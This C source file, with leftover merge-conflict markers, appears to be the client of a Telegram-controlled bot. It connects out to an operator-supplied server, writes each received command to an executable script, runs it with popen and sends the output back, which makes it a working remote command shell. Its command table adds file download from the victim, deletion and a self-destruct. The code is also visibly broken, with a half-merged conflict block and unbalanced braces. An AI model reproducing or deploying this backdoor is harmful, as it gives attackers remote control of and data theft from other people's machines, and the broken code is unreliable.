#include "include/common.h"
<<<<<<< HEAD
=======
#include "Telegram/telegram.h"


#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include <sys/stat.h>

#define OP_START '\\x02'
#define OP_STOP "\x03"

struct message {
    char servermessage[150];
}message;

void *changecommand(char *text);

int check_exe_len();

int main(int argc , char *argv[])
{
    int socket_desc, index = 0, index1 = 0, potnumber_client;
    char message[2000], server_reply[2000], word_copy_message[150];
    struct sockaddr_in server;

    potnumber_client = atoi(argv[2]);
    memset(word_copy_message, 0, 150);

    //Create socket
    //If cannot create socket it return value of socket_desc valuable = -1
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);

    if (3 != argc) {
        fprintf(stderr, "Usage: %s <server> <port>\n", argv[0]);
        exit(1);

    }

    if (socket_desc == -1)
    {
        printf("Could not create socket");
    
    }
         
    server.sin_addr.s_addr = inet_addr(argv[1]);
    server.sin_family = AF_INET;
    server.sin_port = htons(potnumber_client);
 
    //Connect to remote server
    //If cannot connect to server it return value of (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0 and end program
    while(1) {
        socket_desc = socket(AF_INET , SOCK_STREAM , 0);
        server.sin_addr.s_addr = inet_addr(argv[1]);
        server.sin_family = AF_INET;
        server.sin_port = htons(potnumber_client);  
        if(connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) >= 0) {
            printf("Connected\n");
            break;
        } else {
            printf("Try to connected\n");
            usleep(3000000);
        }
    }

    //Send some data (client --> server)

    while(1) {
        //Receive a reply from the server(Server have massage to client and client read this message)
        //bzero(message,2000) --> set a byte string (message)
        bzero(message,2000);
        //If read(socket_desc, message , 2000 ) < 0 it means Server didn't send anything to client
        if( read(socket_desc, message , 2000 ) < 0)
        {
            printf("recieve failed");
        }

        //check message block to change some command
        changecommand(message);
        printf("%s", message);

        //combine all message_box
        FILE *fp;
        fp = fopen("server-message.sh", "w");
        fputs(message, fp);
        fclose(fp);

        
        char mode[] = "0777";
        char buffer[100] = "server-message.sh";
        int i;
        i = strtol(mode, 0, 8);
        if (chmod (buffer,i) < 0)
        {
            fprintf(stderr, "%s: error in chmod(%s, %s) - %d (%s)\n",
                    argv[0], buffer, mode, errno, strerror(errno));
            exit(1);
        }


        //Send to server
        //After Client has recieve form server, Client write message back to server
        // printf("--- Sending init --- \n");
        char tmp[250],buf[250], messageget[250];

        //use popen in order to pointer to the first memory location that hold the results (results ---> value of message)
        fp = fopen("server-message.sh", "r");
        fgets(messageget, 250, fp);
        fp = popen(messageget, "r");

        //fgets use to read next input line to keep in charactor array with value MAXLINE - 1
        while (fgets(buf, 200, fp))
        {
            // printf("%s:\n",buf);
            //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
            if( write(socket_desc , buf , strlen(buf)) < 0)
            {
                printf("Send failed");
                return 1;
            }
            bzero(message,2000);
            bzero(tmp,200);
            bzero(buf,200);
        }
        fclose(fp);

        //Stop sending
        //After Client send message to server
        // printf("Stop sent..\n");
        usleep(1000000); //1second
        sprintf(message,"%s",OP_STOP);

        // printf("%s\n",message);
        if( write(socket_desc , message ,5) < 0)
        {
            printf("Send failed");
            return 1;
        }
        bzero(message,2000);
        bzero(tmp,200);
    char chat_id[60];
    char chat_text[4098];
    bzero(chat_id,60);        
    if( read(socket_desc, chat_id , 50 ) < 0)
    {
        printf("recieve failed");
    }
    printf("%s\n",chat_id);
    bzero(chat_id,60);
    bzero(chat_text,4000);        
    if( read(socket_desc, chat_text , 4000 ) < 0)
    {
        printf("recieve failed");
    }
    printf("%s\n",chat_text);
    bzero(chat_text,4000);

    // while(1) {
    //     //Receive a reply from the server(Server have massage to client and client read this message)
    // //bzero(message,2000) --> set a byte string (message)
    //     bzero(message,2000);
    //     //If read(socket_desc, message , 2000 ) < 0 it means Server didn't send anything to client
    //     if( read(socket_desc, message , 2000 ) < 0)
    //     {
    //         printf("recieve failed");
    //     }

    //     //check message block to change some command
    //     // changecommand(message);
    //     printf("%s", message);
    //     //combine all message_box
    //     FILE *fp;
    //     fp = fopen("server-message.sh", "w");
    //     fputs(message, fp);
    //     fclose(fp);
    //     char mode[] = "0777";
    //     char buffer[100] = "server-message.sh";
    //     int i;
    //     i = strtol(mode, 0, 8);
    //     if (chmod (buffer,i) < 0)
    //     {
    //         fprintf(stderr, "%s: error in chmod(%s, %s) - %d (%s)\n",
    //                 argv[0], buffer, mode, errno, strerror(errno));
    //         exit(1);
    //     }
    //     //Send to server
    //     //After Client has recieve form server, Client write message back to server
    //     // printf("--- Sending init --- \n");
    //     char tmp[1024],buf[1024], messageget[1024];
    //     //use popen in order to pointer to the first memory location that hold the results (results ---> value of message)
    //     // fp = fopen(, "r");
    //     // fgets(messageget, 1024, fp);
    //     fp = popen("timeout 10 ./server-message.sh &> exe.log", "r");
    //     if(check_exe_len())
    //     {
    //         while (fgets(buf, 1024, fp))
    //         {
    //             // printf("%s:\n",buf);
    //             //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
    //             if( write(socket_desc , buf , 1024) < 0)
    //             {
    //                 printf("Send failed");
    //                 return 1;
    //             }
    //             bzero(message,2000);
    //             bzero(tmp,1024);
    //             bzero(buf,1024);
    //         }
    //     }
    //     else{
    //         //sending_exe.log
    //         printf("send exe.log\n");
    //     }
    //     fclose(fp);
    //     //Stop sending
    //     //After Client send message to server
    //     // printf("Stop sent..\n");
    //     usleep(1000000); //1second
    //     sprintf(message,"%s",OP_STOP);
    //     // printf("%s\n",message);
    //     if( write(socket_desc , message ,5) < 0)
    //     {
    //         printf("Send failed");
    //         return 1;
    //     }
    //     bzero(message,2000);
    //     bzero(tmp,200);
    // }
        
    // printf("\n");
     
}
void *changecommand(char *text) {
    char text_build[1000], command_detail[500];
    int start_index, index = 0, length;

    strcpy(text_build, text);
    length = strlen(text);
    memset(text, 0, 2000);
    memset(command_detail, 0, 500);

    if(text_build[0] == '/') {
        start_index = 1;
    } else {
        start_index = 0;
    }
    
    for(start_index; start_index < length; start_index++) {
        text[index] = text_build[start_index];
        index += 1;
        if(strcmp(text, "shell ") == 0) {
            memset(text, 0, 1000);
            index = 0;
            strcpy(command_detail, "Exec shell commands with timeout.");
        }else if(strcmp(text, "mvbot ") == 0) {
            memset(text, 0, 1000);
            index = 0;
            strcpy(command_detail, "Move bot to custom location.");
        }else if(strcmp(text, "timeout ") == 0) {
            memset(text, 0, 1000);
            index = 0;
            strcpy(command_detail, "Set timeout for shell.");
        } else if(strcmp(text, "help") == 0) {
            strcpy(command_detail, "List of commands.");
        }
        else if(strcmp(text, "cp") == 0) {
            strcpy(command_detail, "Copy file/folder.");
        }
        else if(strcmp(text, "mv") == 0) {
            strcpy(command_detail, "Move file/folder.");
        }
        else if(strcmp(text, "rm") == 0) {
            strcpy(command_detail, "Remove file/folder.");
        }
        else if(strcmp(text, "mkdir") == 0) {
            strcpy(command_detail, "Make directory.");
        }
        else if(strcmp(text, "getfile") == 0) {
            strcpy(command_detail, "Download file from bot.");
        }
        else if(strcmp(text, "reserve") == 0) {
            strcpy(command_detail, "Warning text that found in shell.");
        }
        else if(strcmp(text, "BOOM!") == 0) {
            strcpy(command_detail, "DESTROY ITSELF!");
        }
        printf("%s", command_detail);
        memset(command_detail, 0, 500);
    }
    index = 0;
}

int check_exe_len(){
    FILE *fp;
    int len_count=0;
    char buf[2048];
    fp = fopen("exe.log","r");

    while(fgets(buf,1024,fp)){
       len_count++;
    }
    //smaller than 1024
    if(len_count <= 1) return 1;
    //bigger than 1024
    else return 0;
    fclose(fp);
    bzero(buf,2048);
}